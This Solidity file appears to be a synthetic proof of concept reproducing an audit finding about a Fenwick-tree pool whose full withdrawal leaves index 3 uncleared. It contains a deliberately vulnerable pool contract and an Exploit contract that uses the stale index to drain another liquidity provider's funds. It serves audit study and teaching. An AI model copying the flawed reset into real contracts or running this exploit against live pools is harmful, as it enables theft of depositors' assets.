// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Hyperhyper Fenwick — a full withdrawal does not clear every index
    (Pashov Audit Group, C-03, 30 March 2025, finding 57737).
    SYNTHETIC, cheatcode-free. One transaction, no warp.

    _fenwicksUpdate on a dirty tree (sortedKeys.length == 1) assigns
    `value` only along the fenwick chain treeIndex += lsb(treeIndex):
    1, 2, 4, 8. Index 3 is left at the pre-withdrawal amount. The next
    deposit at 3 adds to that stale value, so prefix(3) is 250 ether
    after only 150 ether of new deposits. removeLiquidity pays the
    extra 100 ether out of the other LP's liquidity.

    The fixed full withdrawal zeroes every index. The same deposits
    then unlock 150 ether and the other LP keeps 100 ether. */

contract Asset {
    string public name = "LP-ASSET";
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _move(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "allow");
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        _move(from, to, amount);
        return true;
    }

    function _move(address from, address to, uint256 amount) internal {
        require(balanceOf[from] >= amount, "bal");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
    }
}

contract FenwickPool {
    uint256 public constant MAX = 8;
    Asset public token;
    mapping(uint256 => uint256) public fenwicksTree;
    uint256[] public sortedKeys;
    bool public resetAll;

    constructor(Asset token_, bool resetAll_) {
        token = token_;
        resetAll = resetAll_;
    }

    function _fenwicksUpdate(uint256 treeIndex, uint256 value, bool isDirty) internal {
        while (treeIndex <= MAX) {
            // @> VULN: dirty reset writes only this chain (1, 2, 4, 8). Index 3 keeps the old amount.
            if (isDirty) fenwicksTree[treeIndex] = value;
            else fenwicksTree[treeIndex] += value;
            uint256 nextIndex = treeIndex + (treeIndex & (~treeIndex + 1));
            if (nextIndex > MAX) break;
            treeIndex = nextIndex;
        }
    }

    function deposit(uint256 index, uint256 value) external {
        require(index >= 1 && index <= MAX, "index");
        require(token.transferFrom(msg.sender, address(this), value), "pull");
        sortedKeys.push(index);
        bool isDirty = sortedKeys.length == 1;
        _fenwicksUpdate(index, value, isDirty);
    }

    function prefix(uint256 idx) public view returns (uint256 sum) {
        uint256 i = idx;
        while (i > 0) {
            sum += fenwicksTree[i];
            i -= i & (~i + 1);
        }
    }

    function fullWithdraw() external returns (uint256 amt) {
        amt = prefix(MAX);
        delete sortedKeys;
        if (resetAll) {
            for (uint256 i = 1; i <= MAX; i++) fenwicksTree[i] = 0;
        }
        require(token.transfer(msg.sender, amt), "pay");
    }

    function removeLiquidity(uint256 throughIndex) external returns (uint256 amt) {
        amt = prefix(throughIndex);
        require(token.transfer(msg.sender, amt), "pay");
    }

    /// Other LPs add real tokens. This does not touch the attacker's tree.
    function addOtherLiquidity(uint256 value) external {
        require(token.transferFrom(msg.sender, address(this), value), "pull");
    }
}

contract Holder {
    function approve(Asset token, address spender, uint256 amount) external {
        token.approve(spender, amount);
    }

    function fund(FenwickPool pool, uint256 value) external {
        pool.addOtherLiquidity(value);
    }
}

contract Exploit {
    uint256 public constant FIRST = 100 ether;
    uint256 public constant NEXT = 50 ether;
    uint256 public constant EXTRA = 100 ether;

    Asset public token; // nonce 1
    FenwickPool public pool; // nonce 2
    Holder public victim; // nonce 3

    uint256 public staleAt3;
    uint256 public unlocked;
    uint256 public taken;
    uint256 public victimLeft;

    constructor() {
        token = new Asset();
        pool = new FenwickPool(token, false);
        victim = new Holder();
        token.mint(address(this), FIRST * 3 + NEXT * 3);
        token.mint(address(victim), FIRST);
    }

    function run() external {
        token.approve(address(pool), type(uint256).max);
        victim.approve(token, address(pool), FIRST);

        pool.deposit(1, FIRST);
        pool.deposit(2, FIRST);
        pool.deposit(3, FIRST);
        require(pool.prefix(3) == FIRST * 3, "first epoch unlocks 300");
        uint256 back = pool.fullWithdraw();
        require(back == FIRST * 3, "full withdraw returns 300");
        require(pool.fenwicksTree(3) == FIRST, "index 3 survived the withdrawal");

        victim.fund(pool, FIRST);
        pool.deposit(1, NEXT);
        staleAt3 = pool.fenwicksTree(3);
        require(staleAt3 == FIRST, "index 3 is still the old 100");
        pool.deposit(2, NEXT);
        pool.deposit(3, NEXT);
        unlocked = pool.prefix(3);
        require(unlocked == NEXT * 3 + EXTRA, "prefix(3) is 250, not 150");
        taken = pool.removeLiquidity(3);
        require(taken == unlocked, "remove pays the inflated prefix");
        victimLeft = token.balanceOf(address(pool));
        require(victimLeft == 0, "the other LP's 100 is gone");
        require(taken - NEXT * 3 == EXTRA, "extra is 100");
    }
}
